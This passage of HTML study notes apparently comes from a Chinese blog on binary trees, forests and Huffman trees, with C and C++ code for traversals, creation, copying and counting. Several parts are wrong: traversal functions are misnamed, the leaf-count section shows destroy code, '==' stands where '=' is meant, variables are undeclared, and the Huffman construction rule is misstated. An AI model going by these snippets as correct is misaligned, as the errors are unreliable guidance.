src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8.png"></p><p>性质四</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8.png"></p></li></ul></li></ul></li><li><p>二叉树的存储结构  </p><ul><li>顺序结构</li><li>链式结构<ul><li>二叉链表</li><li>三叉链表</li></ul></li></ul></li><li><p>二叉树的链式存储的储存结构</p><p>二叉链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lChild</span>,*<span class="hljs-title">rChild</span>;</span><br>&#125;BiNode,*BiTree;<br></code></pre></td></tr></table></figure><p>三叉链表(多了一个指向双亲的指针)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BiNode</span> *<span class="hljs-title">lChild</span>,*<span class="hljs-title">parent</span>,*<span class="hljs-title">rChild</span>;</span><br>&#125;BiNode,*BiTree;<br><br></code></pre></td></tr></table></figure><ul><li>在<code>n</code>个节点的二叉链表中，必有<code>2n</code>个链域，除了根节点没有双亲，所以一定会有<code>n-1</code>个节点的链域存放指针，指向非空的子女节点。</li></ul><p>  所以一共有<code>n+1</code>个空指针域</p></li><li><p>二叉树的遍历</p></li></ol><ul><li><p>先序遍历</p><p>先访问根节点，再访问左子树，再访问右子树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%85%88%E5%BA%8F%E9%81%8D%E5%8E%86%E7%AE%97%E6%B3%95.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        visit(T);<br>        PreOrderTraverse(T-&gt;lChild);<br>        PreOrderTraverse(T-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>中序遍历</p><p>先访问左子树，再访问根节点，再访问右子树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        PreOrderTraverse(T-&gt;lChild);<br>        visit(T);<br>        PreOrderTraverse(T-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>后续遍历</p><p>先访问左子树，在访问右子树，最后访问根节点   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,T-&gt;data);<br>&#125;<br><br>status <span class="hljs-title function_">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span>&#123;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        PreOrderTraverse(T-&gt;lChild);<br>        PreOrderTraverse(T-&gt;rChild);<br>        visit(T);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>例题：</p><p>使用二叉树表达算术表达式</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%89%8D%EF%BC%8C%E4%B8%AD%EF%BC%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.png"></p></li><li><p>递归遍历的算法分析</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%81%8D%E5%8E%86%E7%9A%84%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90.png" alt="img"></p><p>从虚线出发到每一个终点路径每个节点经历3次</p></li><li><p>非递归遍历</p><p>中序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E7%9A%84%E9%9D%9E%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;iostream&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stack&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TElemType char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><span class="hljs-function">status <span class="hljs-title">InOrderTraverse</span><span class="hljs-params">(BiTree&amp; T)</span></span>&#123;<br>    std::stack&lt;BiTree&gt; stack;<span class="hljs-comment">//申请一个栈</span><br>    BiTree moveNode=T;<br>    <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>()||moveNode!= <span class="hljs-literal">nullptr</span>)&#123;<br>        <span class="hljs-keyword">if</span>(moveNode!= <span class="hljs-literal">nullptr</span>)&#123;<br>            stack.<span class="hljs-built_in">push</span>(moveNode);<br>            moveNode=moveNode-&gt;lChild;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">auto</span> p=stack.<span class="hljs-built_in">top</span>();<span class="hljs-comment">//得到栈首的元素</span><br>            std::cout&lt;&lt;p-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>            stack.<span class="hljs-built_in">pop</span>();<br>            moveNode=p-&gt;rChild;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p>层次遍历</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">status <span class="hljs-title">LeveIOrder</span><span class="hljs-params">(BiTree&amp; biTree)</span></span>&#123;<br>    std::queue&lt;BiTree&gt; queue;<br>    BiNode* pMove=biTree;<br>    queue.<span class="hljs-built_in">push</span>(biTree);<br>    <span class="hljs-keyword">while</span>(!queue.<span class="hljs-built_in">empty</span>())&#123;<br>        <span class="hljs-keyword">if</span>(queue.<span class="hljs-built_in">front</span>()-&gt;lChild!= <span class="hljs-literal">nullptr</span>)&#123;<br>            queue.<span class="hljs-built_in">push</span>(queue.<span class="hljs-built_in">front</span>()-&gt;lChild);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(queue.<span class="hljs-built_in">front</span>()-&gt;rChild!= <span class="hljs-literal">nullptr</span>)&#123;<br>            queue.<span class="hljs-built_in">push</span>(queue.<span class="hljs-built_in">front</span>()-&gt;rChild);<br>        &#125;<br>        std::cout&lt;&lt;queue.<span class="hljs-built_in">front</span>()-&gt;data&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>        queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><ol start="11"><li><p>二叉树的创建</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">CreatBitree</span><span class="hljs-params">(BiTree* biTree)</span>&#123;<br>    TElemType ch;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>,&amp;ch);<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;#&#x27;</span>)&#123;<br>        <span class="hljs-keyword">return</span> OK;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        (*biTree)=(BiNode*) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode));<br>        (*biTree)-&gt;lChild=<span class="hljs-literal">NULL</span>;<br>        (*biTree)-&gt;rChild=<span class="hljs-literal">NULL</span>;<br>        (*biTree)-&gt;data=ch;<br>        CreatBitree(&amp;(*biTree)-&gt;lChild);<br>        CreatBitree(&amp;(*biTree)-&gt;rChild);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>定义：</p><p>‘#’代表没有节点</p></li></ul><p>所以上面代码的实现是，根据符号来确定是否要创建一个二叉树</p></li><li><p>二叉树的复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">Copy</span><span class="hljs-params">(BiTree T, BiTree *newBitree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (T != <span class="hljs-literal">NULL</span>) &#123;<br>        *newBitree = (BiTree) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(BiNode));<br>        (*newBitree)-&gt;lChild=<span class="hljs-literal">NULL</span>;<br>        (*newBitree)-&gt;rChild=<span class="hljs-literal">NULL</span>;<br>        (*newBitree)-&gt;data=T-&gt;data;<br>        Copy(T-&gt;lChild,&amp;(*newBitree)-&gt;lChild);<br>        Copy(T-&gt;rChild,&amp;(*newBitree)-&gt;rChild);<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算二叉树的深度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">Depen</span><span class="hljs-params">(BiTree biTree)</span>&#123;<br>    <span class="hljs-keyword">if</span>(biTree==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        m= Depen(biTree-&gt;lChild);<br>        n= Depen(biTree-&gt;rChild);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(n&gt;m)&#123;<br>        <span class="hljs-keyword">return</span> (n+<span class="hljs-number">1</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> m+<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算二叉树的节点数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">NodeCount</span><span class="hljs-params">(BiTree biTree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (biTree != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> NodeCount(biTree-&gt;lChild)+ NodeCount(biTree-&gt;rChild)+<span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>计算叶子节点的个数（叶子节点是左右孩子都为<code>NULL</code>的节点）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">status <span class="hljs-title function_">DestroyBiTree</span><span class="hljs-params">(BiTree *biTree)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*biTree == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*biTree)-&gt;lChild != <span class="hljs-literal">NULL</span>) &#123;<br>        DestroyBiTree(&amp;(*biTree)-&gt;lChild);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*biTree)-&gt;rChild != <span class="hljs-literal">NULL</span>) &#123;<br>        DestroyBiTree(&amp;(*biTree)-&gt;rChild);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  %c&quot;</span>, (*biTree)-&gt;data);<br>    <span class="hljs-built_in">free</span>((*biTree));<br>    (*biTree)==<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>线索二叉树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91.png"></p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E7%9A%84%E8%A7%84%E5%88%99.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A2%9E%E5%8A%A0%E4%B8%80%E4%B8%AA%E5%A4%B4%E7%BB%93%E7%82%B9.png"></p></li></ol><h2 id="树和森林"><a href="#树和森林" class="headerlink" title="树和森林"></a>树和森林</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E5%92%8C%E6%A3%AE%E6%9E%97.png"></p><h3 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h3><h4 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91%2F%E5%8F%8C%E4%BA%B2%E8%A1%A8%E7%A4%BA%E6%B3%95.png"></p><p>其中A是虚拟的头节点</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PTNode</span>&#123;</span><br>    TElemType data;<br>    <span class="hljs-type">int</span> parent;<br>&#125;PTNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    PTNode nodes[BUFSIZ];<br>    <span class="hljs-type">int</span> r,n;<span class="hljs-comment">//存放根节点和节点个数</span><br>&#125;PTree;<br></code></pre></td></tr></table></figure><h4 id="孩子链表"><a href="#孩子链表" class="headerlink" title="孩子链表"></a>孩子链表</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E9%93%BE%E8%A1%A8.png"></p><h4 id="带双亲的孩子链表"><a href="#带双亲的孩子链表" class="headerlink" title="带双亲的孩子链表"></a>带双亲的孩子链表</h4><p>只是在孩子链表的基础上多加了双亲的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B8%A6%E5%8F%8C%E4%BA%B2%E7%9A%84%E5%AD%A9%E5%AD%90%E9%93%BE%E8%A1%A8.png"></p><h4 id="孩子兄弟表示法（二叉树表示法，二叉链表表示法）"><a href="#孩子兄弟表示法（二叉树表示法，二叉链表表示法）" class="headerlink" title="孩子兄弟表示法（二叉树表示法，二叉链表表示法）"></a>孩子兄弟表示法（二叉树表示法，二叉链表表示法）</h4><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E5%85%84%E5%BC%9F%E8%A1%A8%E7%A4%BA%E6%B3%95.png"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AD%A9%E5%AD%90%E5%85%84%E5%BC%9F%E8%A1%A8%E7%A4%BA%E6%B3%95%E5%AE%9E%E6%93%8D.png"></p><ul><li><p>将树转换为二叉树</p><p>兄弟相连留长子</p><p>意思是：将兄弟的连起来，只保留双亲与长子的连线</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%B0%86%E6%A0%91%E8%BD%AC%E5%8C%96%E4%B8%BA%E5%85%84%E5%BC%9F%E4%BA%8C%E5%8F%89%E6%A0%91%EF%BC%88%E5%85%84%E5%BC%9F%E5%AD%98%E5%82%A8%E6%B3%95%EF%BC%89.png"></p></li><li><p>将兄弟二叉树，转变为普通的树</p><p>左孩子右右连双亲，去掉原来的右孩子线</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%8F%98%E6%A0%91.png"></p></li></ul><h3 id="森林和二叉树的转化"><a href="#森林和二叉树的转化" class="headerlink" title="森林和二叉树的转化"></a>森林和二叉树的转化</h3><ol><li><p>树变二叉树根相连</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E5%8F%98%E6%88%90%E4%BA%8C%E5%8F%89%E6%A0%91.png"></p></li><li><p>二叉树变森林</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E5%8F%98%E6%A3%AE%E6%9E%97.png"></p></li></ol><h3 id="树的遍历"><a href="#树的遍历" class="headerlink" title="树的遍历"></a>树的遍历</h3><ol><li><p>先根</p><p>如树不为空，那么先遍历根然后在遍历各个子树</p></li><li><p>后根</p><p>若树不为空，后根遍历各课子树，然后访问根节点</p></li></ol><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A0%91%E7%9A%84%E9%81%8D%E5%8E%86.png"></p><h3 id="森林的遍历"><a href="#森林的遍历" class="headerlink" title="森林的遍历"></a>森林的遍历</h3><p>和二叉树的遍历方式一致</p><ol><li><p>先序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E7%9A%84%E9%81%8D%E5%8E%86.png"></p></li><li><p>中序遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E6%A3%AE%E6%9E%97%E7%9A%84%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86.png"></p></li></ol><h2 id="哈夫曼树（最优二叉树）"><a href="#哈夫曼树（最优二叉树）" class="headerlink" title="哈夫曼树（最优二叉树）"></a>哈夫曼树（最优二叉树）</h2><h3 id="判断树"><a href="#判断树" class="headerlink" title="判断树"></a>判断树</h3><p>左边是改进的选择判断语句</p><p>右边是普通的选择判断语句</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%88%A4%E6%96%AD%E6%A0%91.png"></p><ol><li><p>基本概念</p><ul><li><p>路径</p><p>从一个结点到另一个结点的分支构成了结点间的路径</p></li><li><p>结点的路径长度</p><p>两结点间的路径上的分支数</p><p>A-&gt;D 的路径长度是  2</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A62.png"></p></li><li><p>树的路径长度</p><p>从根结点到每个结点的路径长度之和</p></li><li><p>权</p><p>将树中的结点赋一个有某种含义的数值，称为<strong>结点的权</strong></p></li><li><p>结点的带权路径长度</p><p>从根到该节点之间的路径长度×该节点权的结果</p></li><li><p>树的带权路径长度</p><p>树中所有的叶子结点的带权路径长度之和</p></li></ul></li></ol><h3 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h3><p>最优树，也就是带权路径长度最短的树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91.png"></p><ol><li>满二叉树不一定是最优二叉树</li></ol><p><strong>哈夫曼树的特点</strong></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E7%89%B9%E7%82%B9.png"></p><ul><li>只有度（子树个数 ）0为0或2的结点</li><li>一共有<code>2n-1</code>个结点，且新构成的结点都是度为二的结点，原来的结点都是度为一的结点</li><li>一共有n个叶子结点（原来的结点，也就是度为0的结点）</li></ul><h4 id="哈夫曼树的构造"><a href="#哈夫曼树的构造" class="headerlink" title="哈夫曼树的构造"></a>哈夫曼树的构造</h4><ol><li>权值越大的先构造（贪心算法）</li></ol><p>   步骤</p><ul><li>构造森林全是根</li><li>选用两小造新树</li><li>删除两小添新人</li><li>重复2，3剩单根</li></ul><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0.png"></p><p>   删除两小的意思是：删除原来队列里面的两个小的</p><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0%E5%AE%9E%E4%BE%8B.png"></p><p>   直到剩下一棵树，就是哈夫曼树</p><p>   下面是一个例题</p><p>   <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E6%9E%84%E9%80%A0%E4%BE%8B%E9%A2%98.png"></p><ol start="2"><li><p>代码实现</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91%E7%9A%84%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0.png"></p><p>注意重置min的过程，可以改进算法，但是作者还没有学到遍历，所以并没有采取其他方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 